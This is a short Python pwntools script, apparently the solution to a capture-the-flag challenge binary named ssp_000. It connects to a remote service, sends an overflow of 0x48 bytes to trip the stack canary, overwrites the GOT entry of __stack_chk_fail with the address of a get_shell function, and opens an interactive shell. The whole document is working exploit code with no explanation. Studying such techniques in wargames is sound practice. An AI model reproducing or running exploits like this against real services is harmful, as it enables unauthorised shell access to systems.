from pwn import *
p = remote(ADDR, PORT)
e = ELF("./ssp_000")
stk_fail = e.got["__stack_chk_fail"]
get_shell = e.symbols["get_shell"]
p.sendline(b"A" * 0x48)
p.sendlineafter("Addr : ", str(stk_fail))
p.sendlineafter("Value : ", str(get_shell))
p.interactive()